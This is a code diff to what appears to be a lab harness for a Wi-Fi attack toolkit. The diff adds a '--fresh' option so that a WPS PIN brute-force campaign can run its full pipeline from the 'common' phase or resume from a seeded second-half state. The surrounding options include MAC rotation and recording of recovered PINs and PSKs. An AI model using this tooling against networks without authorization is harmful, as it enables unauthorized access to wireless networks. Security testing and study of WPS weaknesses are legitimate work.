@@ -196,12 +196,17 @@ async def mode_campaign(iface, tgt, args):
     from wifit3.engine.attacks.wps.campaign import WpsCampaign, _state_path
     bssid = tgt["bssid"]
     tmp = tempfile.mkdtemp(prefix="wpslab_")   # isolated state dir; don't touch captures/
-    seed = {
-        "bssid": bssid, "ssid": tgt["ssid"], "phase": "second_half",
-        "common_index": 8, "p1_index": 0, "p2_index": args.seed_p2,
-        "first_half": args.seed_first_half, "skip_middle": None, "dead_first_halves": [],
-        "found_pin": None, "found_psk": None, "attempts": 0, "tested": 0, "updated": 0.0,
-    }
+    if args.fresh:
+        # Full pipeline from scratch: COMMON phase then first-half sweep.
+        seed = {"bssid": bssid, "ssid": tgt["ssid"], "phase": "common", "common_index": 0,
+                "p1_index": 0, "p2_index": 0, "first_half": None, "skip_middle": None,
+                "dead_first_halves": [], "found_pin": None, "found_psk": None,
+                "attempts": 0, "tested": 0, "updated": 0.0}
+    else:
+        seed = {"bssid": bssid, "ssid": tgt["ssid"], "phase": "second_half",
+                "common_index": 8, "p1_index": 0, "p2_index": args.seed_p2,
+                "first_half": args.seed_first_half, "skip_middle": None, "dead_first_halves": [],
+                "found_pin": None, "found_psk": None, "attempts": 0, "tested": 0, "updated": 0.0}
     sp = _state_path(tmp, bssid)
     sp.parent.mkdir(parents=True, exist_ok=True)
     sp.write_text(_json.dumps(seed))
@@ -251,6 +256,8 @@ def main() -> int:
     p.add_argument("--seed-first-half", default="0103", help="campaign mode: locked first half")
     p.add_argument("--seed-p2", type=int, default=30, help="campaign mode: second-half start index")
     p.add_argument("--max-secs", type=float, default=120.0, help="campaign mode: run budget")
+    p.add_argument("--fresh", action="store_true",
+                   help="campaign mode: start from COMMON phase (full pipeline), ignore seed")
     p.add_argument("--attempts", type=int, default=20)
     p.add_argument("--mac-mode", choices=["fixed", "rotate"], default="fixed")
     p.add_argument("--timeout", type=float, default=8.0, help="per-message recv window (s)")
